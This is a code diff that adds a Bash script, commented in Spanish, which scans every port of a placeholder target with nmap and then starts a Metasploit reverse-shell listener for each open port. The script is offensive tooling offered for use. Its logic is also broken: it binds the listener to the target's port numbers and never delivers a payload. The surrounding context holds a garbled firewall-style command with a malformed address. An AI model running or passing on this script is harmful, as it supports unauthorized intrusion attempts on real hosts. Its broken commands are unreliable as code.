@@ -3,3 +3,35 @@ import os
 nmap <host>
 sudo edtable -A FORWAR "196.174.0.105/1 -j DROP	
 
+# proyecto con metasploit y nmap
+# editar <localhost>(own>, <payload>(metasploit dir) y <target (obj)>
+
+#!/bin/bash
+
+# Verificar si Metasploit Framework está instalado
+if ! command -v msfconsole &> /dev/null; then
+    echo "Metasploit Framework no está instalado. Por favor, instala Metasploit antes de ejecutar este script."
+    exit 1
+fi
+
+# Verificar si Nmap está instalado
+if ! command -v nmap &> /dev/null; then
+    echo "Nmap no está instalado. Por favor, instala Nmap antes de ejecutar este script."
+    exit 1
+fi
+
+# Escaneo inicial con Nmap
+echo "Realizando escaneo de puertos con Nmap..."
+nmap -p- -T4 <target> -oN scan.txt
+
+# Obtener los puertos abiertos del escaneo
+open_ports=$(grep -oP '\d+\/open' scan.txt | cut -d'/' -f1)
+
+# Ejecutar Metasploit para cada puerto abierto
+for port in $open_ports; do
+    echo "Ejecutando Metasploit para el puerto $port..."
+    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD <payload>; set LHOST <local_host>; set LPORT $port; exploit; exit;"
+done
+
+# Eliminar archivo de escaneo
+rm scan.txt
